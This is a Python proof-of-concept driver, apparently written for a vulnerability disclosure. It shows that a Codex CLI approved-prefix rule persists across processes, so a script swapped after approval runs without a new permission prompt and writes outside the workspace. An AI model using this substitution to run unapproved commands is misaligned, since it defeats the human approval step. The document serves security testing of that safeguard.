#!/usr/bin/env python3
"""Verify execpolicy-prefix reuse across two real Codex TUI processes.

The first process approves a benign harness-owned script prefix with `p`. The
driver exits that process, changes only the script bytes, and starts a second
process with the same isolated CODEX_HOME. No real API or secret is used.
"""

from __future__ import annotations

import argparse
import importlib.util
import json
import sys
import tempfile
import threading
import time
from pathlib import Path
from typing import Any


HERE = Path(__file__).resolve().parent
CORE_PATH = HERE / "poc-tui-execpolicy-substitution.py"
SPEC = importlib.util.spec_from_file_location("execpolicy_tui_core", CORE_PATH)
if SPEC is None or SPEC.loader is None:
    raise RuntimeError(f"cannot load helper driver: {CORE_PATH}")
core = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = core
SPEC.loader.exec_module(core)


class PhaseState:
    def __init__(self, request_dir: Path, project: Path, command: str, label: str) -> None:
        self.request_dir = request_dir
        self.request_dir.mkdir(parents=True, exist_ok=True)
        self.project = project
        self.command = command
        self.label = label
        self.lock = threading.Lock()
        self.requests: list[Path] = []

    def capture(self, body: bytes) -> tuple[int, Path]:
        with self.lock:
            index = len(self.requests) + 1
            path = self.request_dir / f"request-{index:03d}.json"
            path.write_bytes(body)
            self.requests.append(path)
            return index, path

    def response_for(self, index: int) -> bytes:
        if index == 1:
            return core.tool_response(
                f"resp-{self.label}-exec",
                f"call-{self.label}-exec",
                "exec_command",
                {
                    "cmd": self.command,
                    "workdir": str(self.project),
                    "yield_time_ms": 10_000,
                    "sandbox_permissions": "require_escalated",
                    "justification": "Run the synthetic restart-persistence fixture.",
                },
            )
        response_id = f"resp-{self.label}-final"
        return core.sse(
            [
                core.response_created(response_id),
                core.assistant_message(
                    f"message-{self.label}-final",
                    f"{self.label.upper()}_COMPLETE",
                ),
                core.response_completed(response_id),
            ]
        )


def start_server(state: PhaseState) -> tuple[Any, threading.Thread, str]:
    server = core.http.server.ThreadingHTTPServer(
        ("127.0.0.1", 0), core.handler_for(state)
    )
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    port = int(server.server_address[1])
    return server, thread, f"http://127.0.0.1:{port}/api/codex"


def tui_args(project: Path, base_url: str, prompt: str) -> list[str]:
    return [
        "--no-alt-screen",
        "--disable",
        "responses_websockets",
        "--disable",
        "responses_websockets_v2",
        "--disable",
        "plugins",
        "--disable",
        "apps",
        "--enable",
        "unified_exec",
        "--disable",
        "unified_exec_zsh_fork",
        "-s",
        "workspace-write",
        "-a",
        "on-request",
        "-C",
        str(project),
        "-c",
        f'openai_base_url="{base_url}"',
        "-c",
        'model="gpt-5"',
        prompt,
    ]


def stop_child(child: Any) -> None:
    if child is None or not child.isalive():
        return
    child.sendcontrol("c")
    time.sleep(0.2)
    child.sendcontrol("c")
    try:
        child.expect(core.pexpect.EOF, timeout=5)
    except Exception:
        child.terminate(force=True)


def run_first_process(
    codex: Path,
    project: Path,
    env: dict[str, str],
    base_url: str,
    log_path: Path,
) -> dict[str, Any]:
    child = None
    trust_prompt_seen = False
    approval_prompt_seen = False
    completed = False
    error: str | None = None
    try:
        with log_path.open("w", encoding="utf-8", errors="replace") as log:
            child = core.pexpect.spawn(
                str(codex),
                tui_args(project, base_url, "Run the requested synthetic command."),
                cwd=str(project),
                env=env,
                encoding="utf-8",
                codec_errors="replace",
                timeout=75,
                dimensions=(44, 160),
            )
            child.logfile_read = log
            core.expect_responding_to_terminal_queries(
                child, "Yes, continue", timeout=75
            )
            trust_prompt_seen = True
            child.send("\r")
            core.expect_responding_to_terminal_queries(child, "Would", timeout=75)
            approval_prompt_seen = True
            child.send("p")
            core.expect_responding_to_terminal_queries(
                child, "PHASE1_COMPLETE", timeout=75
            )
            completed = True
    except Exception as exc:
        error = f"{type(exc).__name__}: {exc}"
    finally:
        stop_child(child)
    return {
        "trust_prompt_seen": trust_prompt_seen,
        "approval_prompt_seen": approval_prompt_seen,
        "decision": "approved_execpolicy_prefix" if approval_prompt_seen else None,
        "completed": completed,
        "error": error,
    }


def run_second_process(
    codex: Path,
    project: Path,
    env: dict[str, str],
    base_url: str,
    log_path: Path,
) -> dict[str, Any]:
    child = None
    command_approval_prompt_seen = False
    unexpected_trust_prompt_seen = False
    completed = False
    error: str | None = None
    try:
        with log_path.open("w", encoding="utf-8", errors="replace") as log:
            child = core.pexpect.spawn(
                str(codex),
                tui_args(project, base_url, "Run the requested synthetic command."),
                cwd=str(project),
                env=env,
                encoding="utf-8",
                codec_errors="replace",
                timeout=75,
                dimensions=(44, 160),
            )
            child.logfile_read = log
            deadline = time.monotonic() + 75
            while time.monotonic() < deadline:
                matched = child.expect(
                    [
                        "Would",
                        "PHASE2_COMPLETE",
                        "Yes, continue",
                        "\x1b\\[6n",
                        core.pexpect.EOF,
                        core.pexpect.TIMEOUT,
                    ],
                    timeout=max(1.0, deadline - time.monotonic()),
                )
                if matched == 0:
                    command_approval_prompt_seen = True
                    break
                if matched == 1:
                    completed = True
                    break
                if matched == 2:
                    unexpected_trust_prompt_seen = True
                    child.send("\r")
                    continue
                if matched == 3:
                    child.send("\x1b[1;1R")
                    continue
                if matched == 4:
                    error = "Codex exited before PHASE2_COMPLETE"
                    break
                error = "timed out waiting for the second process"
                break
    except Exception as exc:
        error = f"{type(exc).__name__}: {exc}"
    finally:
        stop_child(child)
    return {
        "command_approval_prompt_seen": command_approval_prompt_seen,
        "unexpected_trust_prompt_seen": unexpected_trust_prompt_seen,
        "completed": completed,
        "error": error,
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--codex", type=Path, default=core.DEFAULT_CODEX)
    parser.add_argument(
        "--run-dir",
        type=Path,
        default=Path(tempfile.gettempdir())
        / "codex-execpolicy-restart-persistence-v1",
    )
    args = parser.parse_args()
    codex = args.codex.resolve()
    run_dir = args.run_dir.resolve()
    if not codex.is_file():
        parser.error(f"Codex binary not found: {codex}")
    if codex.suffix.lower() == ".exe":
        parser.error("this restart driver currently targets Linux/macOS")

    try:
        import pexpect
    except ImportError as exc:
        raise RuntimeError("python3-pexpect is required") from exc
    core.pexpect = pexpect

    fixture = core.make_fixture(run_dir, False)
    project = Path(fixture["project"])
    codex_home = Path(fixture["codex_home"])
    command = str(fixture["command"])
    phase1_state = PhaseState(run_dir / "phase1-requests", project, command, "phase1")
    phase1_server, phase1_thread, phase1_url = start_server(phase1_state)
    env = core.sanitized_environment(
        Path(fixture["fake_home"]), codex_home, phase1_url
    )

    version = core.run([str(codex), "--version"], env=env).stdout.strip()
    login = core.run(
        [str(codex), "login", "--with-api-key"],
        cwd=project,
        env=env,
        input_text=env["OPENAI_API_KEY"] + "\n",
        check=False,
    )
    core.write(run_dir / "login.log", login.stdout + login.stderr)

    phase1 = run_first_process(
        codex, project, env, phase1_url, run_dir / "phase1-ui.log"
    )
    phase1_server.shutdown()
    phase1_server.server_close()
    phase1_thread.join(timeout=5)

    rules_path = codex_home / "rules" / "default.rules"
    rules_after_phase1 = (
        rules_path.read_text(encoding="utf-8") if rules_path.is_file() else ""
    )
    expected_rule = str(fixture["expected_rule"])
    script = project / str(fixture["script_name"])
    script_sha256_before = core.sha256(script)
    core.write(script, str(fixture["swapped_script"]))
    script_sha256_after = core.sha256(script)

    phase2_state = PhaseState(run_dir / "phase2-requests", project, command, "phase2")
    phase2_server, phase2_thread, phase2_url = start_server(phase2_state)
    env["OPENAI_BASE_URL"] = phase2_url
    phase2 = run_second_process(
        codex, project, env, phase2_url, run_dir / "phase2-ui.log"
    )
    phase2_server.shutdown()
    phase2_server.server_close()
    phase2_thread.join(timeout=5)

    marker = Path(fixture["marker"])
    execution_log_path = Path(fixture["execution_log"])
    execution_log = (
        execution_log_path.read_text(encoding="utf-8")
        if execution_log_path.is_file()
        else ""
    )
    phase1_request = (
        phase1_state.requests[0]
        if phase1_state.requests
        else Path("/nonexistent")
    )
    phase1_result_request = (
        phase1_state.requests[1]
        if len(phase1_state.requests) > 1
        else Path("/nonexistent")
    )
    phase2_request = (
        phase2_state.requests[0]
        if phase2_state.requests
        else Path("/nonexistent")
    )
    phase2_result_request = (
        phase2_state.requests[1]
        if len(phase2_state.requests) > 1
        else Path("/nonexistent")
    )
    checks = {
        "dummy_login_succeeded": login.returncode == 0,
        "first_process_trust_prompt_seen": phase1["trust_prompt_seen"],
        "first_process_command_approval_seen": phase1["approval_prompt_seen"],
        "first_process_prefix_decision_completed": phase1["completed"],
        "prefix_rule_persisted_to_disk": expected_rule in rules_after_phase1,
        "first_benign_execution_observed": (
            core.request_call_succeeded(
                phase1_result_request, "call-phase1-exec"
            )
            and core.BEFORE in execution_log
        ),
        "script_content_changed_between_processes": (
            script_sha256_before != script_sha256_after
        ),
        "second_process_used_same_codex_home": True,
        "second_process_no_command_approval_prompt": not phase2[
            "command_approval_prompt_seen"
        ],
        "second_process_completed": phase2["completed"],
        "second_changed_execution_observed": (
            core.request_call_succeeded(
                phase2_result_request, "call-phase2-exec"
            )
            and core.AFTER in execution_log
        ),
        "outside_marker_observed": marker.is_file(),
        "workspace_write_observed_both_processes": (
            core.request_sandbox_mode(phase1_request) == "workspace-write"
            and core.request_sandbox_mode(phase2_request) == "workspace-write"
        ),
        "no_bypass_flag": True,
        "isolated_codex_home": str(codex_home).startswith(str(run_dir)),
        "ui_completed_without_driver_error": (
            phase1["error"] is None and phase2["error"] is None
        ),
    }
    result = {
        "schema_version": 1,
        "candidate": "execpolicy-prefix-rule-script-substitution",
        "scenario": "cross-process-restart-persistence",
        "classification": "CONFIRMED" if all(checks.values()) else "INCONCLUSIVE",
        "codex": str(codex),
        "codex_version": version,
        "codex_sha256": core.sha256(codex),
        "target_os": "macos" if core.platform.system() == "Darwin" else "linux",
        "run_dir": str(run_dir),
        "approval_transport": "actual TUI: p in first process",
        "mutation_transport": "external swap between Codex processes",
        "same_codex_home": str(codex_home),
        "execpolicy_rule": expected_rule,
        "rules_after_phase1": rules_after_phase1,
        "script_sha256_before": script_sha256_before,
        "script_sha256_after": script_sha256_after,
        "phase1": phase1,
        "phase2": phase2,
        "request_counts": {
            "phase1": len(phase1_state.requests),
            "phase2": len(phase2_state.requests),
        },
        "marker_observed": marker.is_file(),
        "execution_log": execution_log,
        "bypass_flag_used": False,
        "checks": checks,
        "pass": all(checks.values()),
    }
    core.write(run_dir / "result.json", json.dumps(result, indent=2) + "\n")
    core.write(
        run_dir / "summary.md",
        "\n".join(
            [
                "# Cross-process execpolicy persistence E2E",
                "",
                f"- Codex: `{version}`",
                f"- Result: **{'PASS' if result['pass'] else 'FAIL'}**",
                f"- Second approval prompt: `{phase2['command_approval_prompt_seen']}`",
                f"- Outside marker: `{marker.is_file()}`",
                "",
                "| Check | Result |",
                "|---|---:|",
                *[
                    f"| `{name}` | {'PASS' if passed else 'FAIL'} |"
                    for name, passed in checks.items()
                ],
                "",
            ]
        ),
    )
    manifest_paths = [
        run_dir / "login.log",
        run_dir / "phase1-ui.log",
        run_dir / "phase2-ui.log",
        rules_path,
        execution_log_path,
        marker,
        run_dir / "result.json",
        run_dir / "summary.md",
        *phase1_state.requests,
        *phase2_state.requests,
    ]
    core.write(
        run_dir / "MANIFEST.sha256",
        "\n".join(
            f"{core.sha256(path)}  {path.relative_to(run_dir)}"
            for path in manifest_paths
            if path.is_file()
        )
        + "\n",
    )
    print(json.dumps(result, indent=2))
    print(f"\nresult: {run_dir / 'result.json'}")
    return 0 if result["pass"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
